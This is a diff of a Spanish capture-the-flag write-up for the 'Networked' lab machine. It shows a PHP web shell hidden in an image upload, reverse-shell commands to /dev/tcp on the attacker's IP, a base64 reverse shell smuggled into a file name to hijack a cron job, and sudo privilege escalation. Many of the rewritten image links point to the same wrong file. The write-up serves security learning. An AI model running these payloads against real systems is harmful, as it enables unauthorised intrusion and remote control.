@@ -16,12 +16,12 @@ nmap -p22,80 -sCV 10.129.233.119 -oN targeted
 
 ![20250619154031](Networked_images/20250619154031.png)
 
-![[Pasted image 20250619154118.png]]
+![20250619154118.png](Networked_images/20250619154118.png)
 
 
 # Puerto 80
 
-![[Pasted image 20250619154205.png]]
+![20250619154205.png](Networked_images/20250619154205.png)
 
 >Encontramos  un mensaje que no aporta mucho 
 
@@ -31,7 +31,7 @@ nmap -p22,80 -sCV 10.129.233.119 -oN targeted
 gobuster dir -u 10.129.233.150 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40
 ```
 
-![[Pasted image 20250619154402.png]]
+![20250619154402.png](Networked_images/20250619154402.png)
 
 ```bash
 /.hta                 (Status: 403) [Size: 206]
@@ -73,7 +73,7 @@ directorios de interes:
 
 ## /backup
 
-![[Pasted image 20250619154511.png]]
+![20250619154511.png](Networked_images/20250619154511.png)
 
 >Descargamos el archivo backup.tar y lo descomprimimos
 
@@ -81,42 +81,42 @@ directorios de interes:
 7z x backup.tar
 ```
 
-![[Pasted image 20250619154720.png]]
+![[Pasted image 20250619154720.png]](Networked_images/20250619154205.png)
 
 ### index.php
-![[Pasted image 20250619154841.png]]
+![[Pasted image 20250619154841.png]](Networked_images/20250619154205.png)
 
 ### lib.php
 
-![[Pasted image 20250619154958.png]]
+![[Pasted image 20250619154958.png]](Networked_images/20250619154205.png)
 ### photos.php
 
-![[Pasted image 20250619155045.png]]
-![[Pasted image 20250619155106.png]]
+![[Pasted image 20250619155045.png]](Networked_images/20250619154205.png)
+![[Pasted image 20250619155106.png]](Networked_images/20250619154205.png)
 
-![[Pasted image 20250619155252.png]]
+![[Pasted image 20250619155252.png]](Networked_images/20250619154205.png)
 
 ### upload.php
 
-![[Pasted image 20250619155316.png]]
-![[Pasted image 20250619155334.png]]
+![[Pasted image 20250619155316.png]](Networked_images/20250619154205.png)
+![[Pasted image 20250619155334.png]](Networked_images/20250619154205.png)
 
-![[Pasted image 20250619155419.png]]
+![[Pasted image 20250619155419.png]](Networked_images/20250619154205.png)
 
 ## Pruebas de uploads archivos
 
 >Probamos a subir una imagen de tamaño menor a 60KB 
 
 
-![[Pasted image 20250619155711.png]]
+![[Pasted image 20250619155711.png]](Networked_images/20250619154205.png)
 
-![[Pasted image 20250619155826.png]]
+![[Pasted image 20250619155826.png]](Networked_images/20250619154205.png)
 
-![[Pasted image 20250619155850.png]]
+![[Pasted image 20250619155850.png]](Networked_images/20250619154205.png)
 
 >Efectivamente la foto se subió correctamente, comprobamos que esta en /photos.php
 
-![[Pasted image 20250619155954.png]]
+![[Pasted image 20250619155954.png]](Networked_images/20250619154205.png)
 
 >Comprobamos que la foto esta en /photos.php y que se le ha asignado el nombre 10_10_14_49.jpeg que es nuestra ip cambiando 
 >" . " por " _ " 
@@ -133,7 +133,7 @@ php
 
 ```
 
-![[Pasted image 20250619160258.png]]
+![[Pasted image 20250619160258.png]](Networked_images/20250619154205.png)
 
 ### inyectamos la shell en la imagen
 
@@ -141,7 +141,7 @@ php
 cat shell.php >> camel1.jpeg
 ```
 
-![[Pasted image 20250619160504.png]]
+![[Pasted image 20250619160504.png]](Networked_images/20250619154205.png)
 
 >Cambiamos el nombre de la foto para que tenga el .php
 
@@ -149,13 +149,13 @@ cat shell.php >> camel1.jpeg
 mv camel1.jpeg camel1.php.jpeg
 ```
 
-![[Pasted image 20250619160533.png]]
+![[Pasted image 20250619160533.png]](Networked_images/20250619154205.png)
 
 ### Subimos la foto a la web
 
 >Igual que antes vamos a /upload.php subimos la foto y comprobamos que esta en /photos.php
 
-![[Pasted image 20250619160709.png]]
+![[Pasted image 20250619160709.png]](Networked_images/20250619154205.png)
 
 ### Tratamos de ejecutar comandos por GET
 
@@ -167,7 +167,7 @@ y tratamos de inyectar código
 /uploads/10_10_14_49.php.jpeg?cmd=id
 ```
 
-![[Pasted image 20250619161031.png]]
+![[Pasted image 20250619161031.png]](Networked_images/20250619154205.png)
 
 >Comprobamos que si funciona 
 
@@ -182,7 +182,7 @@ php
 
 ```
 
-![[Pasted image 20250619160258.png]]
+![[Pasted image 20250619160258.png]](Networked_images/20250619154205.png)
 
 
 ##### creamos un archivo .php.png que contenga la cadena 89 50 4E 47 0D 0A 1A 0A
@@ -193,7 +193,7 @@ php
 echo '89 50 4E 0D 0A 1A 0A' |xxd -p -r > nombre_archivo.php.png
 ```
 
-![[Pasted image 20250619161331.png]]
+![[Pasted image 20250619161331.png]](Networked_images/20250619154205.png)
 
 
 ##### inyectamos el php de antes en el archivo
@@ -202,17 +202,17 @@ echo '89 50 4E 0D 0A 1A 0A' |xxd -p -r > nombre_archivo.php.png
 cat shell.php >> colada_shell.php.png
 ```
 
-![[Pasted image 20250619161807.png]]
+![[Pasted image 20250619161807.png]](Networked_images/20250619154205.png)
 
 ##### subimos el archivo en /upload.php
 
-![[Pasted image 20250619161533.png]]
+![[Pasted image 20250619161533.png]](Networked_images/20250619154205.png)
 
 ##### verificamos que el archivo este en 10.129.233.150/photos.php y vemos el nombre asignado por sistema
 
 > el nombre es nuestra ip pero en vez de puntos con guion bajo 10_10_14_49.php.png
 
-![[Pasted image 20250619161624.png]]
+![[Pasted image 20250619161624.png]](Networked_images/20250619154205.png)
 
 
 ##### vamos a 10.129.233.150/uploads/10_10_14_49.php.png y tratamos de inyectar comandos
@@ -221,7 +221,7 @@ cat shell.php >> colada_shell.php.png
 10.129.233.150/uploads/10_10_14_49.php.png?cmd=id
 ```
 
-![[Pasted image 20250619161912.png]]
+![[Pasted image 20250619161912.png]](Networked_images/20250619154205.png)
 
 >De esta manera nos ahorramos ver todo el texto de la imagen y vemos directamente la respuesta de los comandos
 
@@ -230,7 +230,7 @@ cat shell.php >> colada_shell.php.png
 
 Nos ponemos en escucha por el puerto 443 
 
-![[Pasted image 20250619162146.png]]
+![[Pasted image 20250619162146.png]](Networked_images/20250619154205.png)
 
 Desde la web mandamos la shell
 
@@ -238,24 +238,24 @@ Desde la web mandamos la shell
 10.129.233.150/uploads/10_10_14_49.php.png?cmd=bash -c "bash -i %26> /dev/tcp/10.10.14.49/443 0>%261"
 ```
 
-![[Pasted image 20250619162304.png]]
+![[Pasted image 20250619162304.png]](Networked_images/20250619154205.png)
 
 #### una vez recibimos la shell la tratamos con python 
-![[Pasted image 20250619162509.png]]
+![[Pasted image 20250619162509.png]](Networked_images/20250619154205.png)
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 >ctrl +z
 
-![[Pasted image 20250619162653.png]]
+![[Pasted image 20250619162653.png]](Networked_images/20250619154205.png)
 
 
 >ahora hay que tratar de llegar al usuario guly 
 
 >leemos los archivos del directorio guly donde vemos que se ejecuta un cron y que no sanitiza la informacion 
 
-![[Pasted image 20250619162916.png]]
+![[Pasted image 20250619162916.png]](Networked_images/20250619154205.png)
 
 
 #### realizamos un script de r.shell codificado en base64
@@ -268,19 +268,19 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 echo -n 'bash -c "bash -i &> /dev/tcp/10.10.14.49/4444 0>&1"' |base64
 ```
 
-![[Pasted image 20250619163210.png]]
+![[Pasted image 20250619163210.png]](Networked_images/20250619154205.png)
 
 ```bash
 YmFzaCAtYyAiYmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC40OS80NDQ0IDA+JjEi
 ```
-![[Pasted image 20250619163224.png]]
+![[Pasted image 20250619163224.png]](Networked_images/20250619154205.png)
 
 
 #### utilizamos touch para que se ejecute el cron 
 
 >Nos ponemos en escucha por el puerto que hayamos elegido 
 
-![[Pasted image 20250619163432.png]]
+![[Pasted image 20250619163432.png]](Networked_images/20250619154205.png)
 
 ```bash
 touch -- ';echo YmFzaCAtYyAiYmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC40OS80NDQ0IDA+JjEi |base64 -d|bash'
@@ -289,7 +289,7 @@ touch -- ';echo YmFzaCAtYyAiYmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC40OS80NDQ0IDA+
 >en nuestra terminal en escucha por el puerto 4444 deberíamos recibir una shell como guly (el cron se ejecuta cada 3 minutos igual tenemos que esperar un poco)
 
 #### tratamos la shell con python
-![[Pasted image 20250619163935.png]]
+![[Pasted image 20250619163935.png]](Networked_images/20250619154205.png)
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -297,17 +297,17 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 >ctrl +z
 
-![[Pasted image 20250619162653.png]]
+![[Pasted image 20250619162653.png]](Networked_images/20250619154205.png)
 
 
 > vemos "id" para saber los grupos en los que estamos miramos "sudo -l" para ver si tenemos acceso a algun binario como root
 
-![[Pasted image 20250619164133.png]]
+![[Pasted image 20250619164133.png]](Networked_images/20250619154205.png)
 
 >descubrimos con "sudo -l" un programa .sh llamado "changenames.sh" que podemos ejecutar como root sin pass
 
 #### leemos lo que hay en el archivo /usr/local/sbin/changename.sh
-![[Pasted image 20250619164258.png]]
+![[Pasted image 20250619164258.png]](Networked_images/20250619154205.png)
 
 #### ejecutamos el programa con sudo 
 
@@ -328,11 +328,11 @@ interface BOOTPROTO:
 cualquiercosa 
 ```
 
-![[Pasted image 20250619164400.png]]
+![[Pasted image 20250619164400.png]](Networked_images/20250619154205.png)
 
 >pulsamos enter y tenemos shell como root
 
-![[Pasted image 20250619164445.png]]
+![[Pasted image 20250619164445.png]](Networked_images/20250619154205.png)
 
 ```bash
 [root@networked network-scripts]# whoami
